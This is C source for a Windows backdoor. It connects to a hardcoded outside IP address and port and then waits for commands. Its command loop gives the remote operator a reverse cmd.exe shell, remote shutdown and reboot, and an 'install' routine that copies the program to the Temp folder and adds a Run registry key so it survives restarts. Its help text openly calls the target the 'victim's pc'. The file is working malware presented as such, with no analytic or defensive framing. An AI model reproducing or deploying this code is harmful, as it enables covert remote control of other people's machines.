#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <string.h>
#include <shellapi.h>

#pragma comment(lib,"ws2_32.lib")

void install() {
	char des_path[0x128];
	strcpy(des_path, "C:\\Users\\");
	TCHAR username[0x20];
	DWORD username_len = 0x20;
	GetUserName(username, &username_len);
	strcat(des_path, username);
	strcat(des_path, "\\AppData\\Local\\Temp");
	puts(des_path);
	TCHAR buffer[0x128];
	if (!GetModuleFileNameA(0, buffer, 0x128)) {
		puts("Fail to get path");
		exit(0);
	}
	strcat(des_path, "\\temp.exe");
	BOOL test = CopyFile(buffer, des_path, 1);
	DWORD attributes = GetFileAttributesA(des_path);
	SetFileAttributesA(buffer, attributes + FILE_ATTRIBUTE_HIDDEN);
	HKEY hKey;
	LPCSTR name_reg = "doanxem";
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0xF003F, &hKey) != ERROR_SUCCESS) {
		exit(0);
	}
	if (RegSetValueExA(hKey, name_reg, 0, 1, (BYTE*)des_path, strlen(des_path)) != ERROR_SUCCESS) {
		exit(0);
	}
}


void Server()
{
	SOCKET my_sock;
	struct sockaddr_in server_info;
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);
	server_info.sin_family = AF_INET;
	server_info.sin_port = htons(12345);
	server_info.sin_addr.s_addr = inet_addr("35.247.171.91");
	my_sock = WSASocketA(AF_INET, 1, 6, NULL, (unsigned int)NULL, (unsigned int)NULL);
	if (my_sock == INVALID_SOCKET) {
		exit(0);
	}
	if (WSAConnect(my_sock, (SOCKADDR*)& server_info, sizeof(server_info), NULL, NULL, NULL, NULL) == INVALID_SOCKET){
	exit(0);
	}
	char hello[] = "Hello Server !!\n";
	char buf_recv[20] = { 0 };
	send(my_sock, hello, strlen(hello), 0);
	while (1) {
		recv(my_sock, buf_recv, sizeof(buf_recv), 0);
		if (!strcmp(buf_recv, "shell\n")) {
			STARTUPINFO s_info;
			PROCESS_INFORMATION p_info;
			memset(&s_info, 0, sizeof(s_info));
			s_info.cb = sizeof(s_info);
			s_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			s_info.hStdInput = s_info.hStdOutput = s_info.hStdError = (HANDLE)my_sock;

			TCHAR commandLine[] = "cmd.exe";
			CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &s_info, &p_info);

		}
		else if (!strcmp(buf_recv, "shutdown\n")) {
			system("shutdown -s -t 0");
		}
		else if (!strcmp(buf_recv, "reboot\n")) {
			system("shutdown -r");
		}
		else if (!strcmp(buf_recv, "end\n")) {
			break;
		}
		else if (!strcmp(buf_recv, "install\n")) {
			install();
			ZeroMemory(buf_recv, sizeof(buf_recv));
		}
		else {
			char error[] = "WRONG COMMAND !!\ninstall: Install to victim's pc\nshell: reverse-shell\nshudown : shutdown victim'pc\nreboot: reboot victim's pc\nend : end process\n";
			send(my_sock, error, strlen(error), 0);
			continue;
		}
		Sleep(300000);
	}
	WSACleanup();
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	Server();
	return 0;
}